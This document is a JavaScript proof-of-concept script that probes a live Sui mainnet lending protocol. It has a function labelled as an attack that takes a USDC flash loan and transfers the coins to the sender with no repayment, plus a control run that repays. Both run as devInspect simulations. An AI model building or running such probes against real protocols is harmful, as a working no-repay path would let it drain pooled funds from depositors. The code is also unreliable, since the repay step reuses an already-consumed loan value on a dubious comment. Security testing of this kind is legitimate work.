const { SuiClient, getFullnodeUrl, TransactionBlock } = require('@mysten/sui.js');

const client = new SuiClient({ url: getFullnodeUrl('mainnet') });

const CONFIG_ID  = '0x3672b2bf471a60c30a03325f104f92fb195c9d337ba58072dce764fe2aa5e2dc';
const POOL_ID    = '0xa3582097b4c57630046c0c49a88bfc6b202a3ec0a9db5597c31765f7563755a8';
const STORAGE_ID = '0xbb4e2f4b6205c2e2a2db47aeb4f830796ec7c005f88537ee775986639bc442fe';
const CLOCK_ID   = '0x0000000000000000000000000000000000000000000000000000000000000006';
const TYPE_ARG   = '0xdba34672e30cb065b1f93e3ab55318768fd6fef66c15942c9f7cb846e2f900e7::usdc::USDC';
const LENDING_PKG = '0x81c408448d0d57b3e371ea94de1d40bf852784d3e225de1e74acab3e8395c18f';

// Use a dummy but valid-format address; devInspect does not require ownership of anything beyond shared objects.
const SENDER = '0x825d7d067cec8fb08387fa0225d2bd144ae8aca9ed890ecc27ac5a2657296c92';

const AMOUNT = 1000000n; // 1 USDC

async function devInspectNoRepay() {
  const tx = new TransactionBlock();
  tx.setSender(SENDER);

  const loan = tx.moveCall({
    target: `${LENDING_PKG}::lending::flash_loan_with_ctx`,
    typeArguments: [TYPE_ARG],
    arguments: [tx.object(CONFIG_ID), tx.object(POOL_ID), tx.pure.u64(AMOUNT)],
  });

  const coinFromLoan = tx.moveCall({
    target: `0x2::coin::from_balance`,
    typeArguments: [TYPE_ARG],
    arguments: [loan],
  });

  tx.moveCall({
    target: `0x2::transfer::public_transfer`,
    typeArguments: [TYPE_ARG],
    arguments: [coinFromLoan, tx.pure.address(SENDER)],
  });

  const res = await client.devInspectTransactionBlock({
    sender: SENDER,
    transactionBlock: await tx.build({ client }),
  });
  return res;
}

async function devInspectWithRepay() {
  const tx = new TransactionBlock();
  tx.setSender(SENDER);

  const loan = tx.moveCall({
    target: `${LENDING_PKG}::lending::flash_loan_with_ctx`,
    typeArguments: [TYPE_ARG],
    arguments: [tx.object(CONFIG_ID), tx.object(POOL_ID), tx.pure.u64(AMOUNT)],
  });

  const loanCoin = tx.moveCall({
    target: `0x2::coin::from_balance`,
    typeArguments: [TYPE_ARG],
    arguments: [loan],
  });

  const loanBal = tx.moveCall({
    target: `0x2::coin::into_balance`,
    typeArguments: [TYPE_ARG],
    arguments: [loanCoin],
  });

  tx.moveCall({
    target: `${LENDING_PKG}::lending::flash_repay_with_ctx`,
    typeArguments: [TYPE_ARG],
    arguments: [
      tx.object(CLOCK_ID),
      tx.object(STORAGE_ID),
      tx.object(POOL_ID),
      loan, // second return is implicitly used for Receipt
      loanBal,
    ],
  });

  const res = await client.devInspectTransactionBlock({
    sender: SENDER,
    transactionBlock: await tx.build({ client }),
  });
  return res;
}

(async () => {
  try {
    console.log('--- devInspect attack_no_repay ---');
    const a = await devInspectNoRepay();
    console.dir(a.effects?.status ?? a, { depth: null });

    console.log('--- devInspect control_with_repay ---');
    const b = await devInspectWithRepay();
    console.dir(b.effects?.status ?? b, { depth: null });
  } catch (e) {
    console.error(e);
    process.exit(1);
  }
})();
